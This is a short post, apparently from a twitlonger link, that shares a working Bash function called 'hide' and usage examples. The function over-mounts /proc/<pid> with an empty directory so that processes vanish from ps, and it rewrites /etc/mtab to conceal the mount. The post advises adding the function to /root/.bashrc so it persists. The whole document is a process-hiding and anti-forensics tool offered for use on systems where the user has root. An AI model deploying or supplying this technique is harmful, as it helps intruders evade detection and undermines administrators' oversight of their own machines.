https://www.twitlonger.com/show/n_1ss9dor

```bash
hide()
{
[[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
_pid=${1:-$$}
[[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo "[Alh4zr3d] PID $_pid is now hidden"; return; }
local _argstr
for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
[[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
}
```

- This is an old Linux trick executed in BASH that simply over-mounts a particular PID in /proc with a useless, empty directory, so that /proc/<pid> doesn't get populated with the usual process information. (invisible to the `ps` command, for example)
- Requires root permissions; either execute it in your shell or slap it into /root/.bashrc
  
  
### EXAMPLES:
- Hide the current shell/PID: `hide`
- Hide process with pid 31337: `hide 31337`
- Hide `sleep 1234`: hide sleep 1234
- Start and hide `sleep 1234` as a background process: `hide nohup sleep 1234 &>/dev/null &`
